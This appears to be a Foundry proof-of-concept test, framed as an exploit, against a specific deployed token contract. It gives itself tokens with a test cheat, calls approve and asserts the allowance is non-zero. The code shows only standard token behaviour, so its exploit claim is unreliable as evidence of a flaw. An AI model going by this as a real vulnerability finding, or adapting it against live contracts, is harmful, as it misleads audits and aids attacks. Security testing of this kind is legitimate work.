// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITouch {
    function approve(address _spender, uint256 _value) external returns (bool);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function balanceOf(address _owner) external view returns (uint256);
    function unrestricted() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    ITouch public touch;
    address public spender;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        touch = ITouch(TARGET);
        vm.label(TARGET, "Touch Token");
        spender = address(0xBEEF);
        vm.label(spender, "Spender");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Inject tokens to attacker (deal works on token contract balance mapping)
        deal(TARGET, attacker, 1000 * 1e18);

        // Verify attacker has tokens
        uint256 balance = touch.balanceOf(attacker);
        console.log("Attacker balance:", balance);

        // Set approval to non-zero value (current allowance is 0, so this succeeds)
        touch.approve(spender, 1000 * 1e18);

        // Verify the allowance is now non-zero
        uint256 allowance = touch.allowance(attacker, spender);
        console.log("Allowance:", allowance);
        assertGt(allowance, 0, "Allowance should be non-zero");
        assertTrue(allowance != 0, "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
